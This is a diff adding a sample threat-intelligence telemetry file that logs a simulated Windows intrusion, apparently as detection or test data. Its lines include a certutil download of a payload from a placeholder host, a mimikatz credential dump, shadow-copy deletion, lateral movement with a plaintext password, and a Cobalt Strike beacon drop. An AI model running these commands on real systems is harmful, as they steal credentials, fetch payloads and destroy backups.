@@ -1,0 +1,12 @@
+# Threat Intelligence Sample Telemetry Stream
+# Format: timestamp|sourceIp|targetHost|eventType|payload
+2026-09-22T10:40:01|10.0.14.23|HOST-014|AUTH|user admin logged in successfully
+2026-09-22T10:42:18|10.0.14.23|HOST-014|EXEC|cmd.exe /c whoami /priv > %TEMP%\privs.txt
+2026-09-22T10:43:02|10.0.14.23|HOST-014|EXEC|powershell -enc SGVsbG8gV29ybGQgZnJvbSBQb3dlclNoZWxs
+2026-09-22T10:44:11|10.0.14.23|HOST-014|NET|connection established to 10.0.1.1:443
+2026-09-22T10:45:17|10.0.14.23|HOST-022|LATERAL|net use \\HOST-022\IPC$ /u:domain\admin Password123
+2026-09-22T10:47:33|10.0.14.23|HOST-022|EXEC|certutil -urlcache -split -f http://198.51.100.44/stage.bin certutil -urlcache -f
+2026-09-22T10:49:05|10.0.14.23|HOST-022|TOOL|c:\tools\mimikatz.exe sekurlsa::logonpasswords exit
+2026-09-22T10:51:22|10.0.14.23|DC-001|DEF_EVASION|cmd.exe /c vssadmin delete shadows /all /quiet
+2026-09-22T10:53:40|10.0.14.23|FS-002|C2|dropping file cobaltstrike.beacon to system32
+2026-09-22T10:55:00|192.168.1.50|WORK-099|BENIGN|scheduled system backup completed without errors
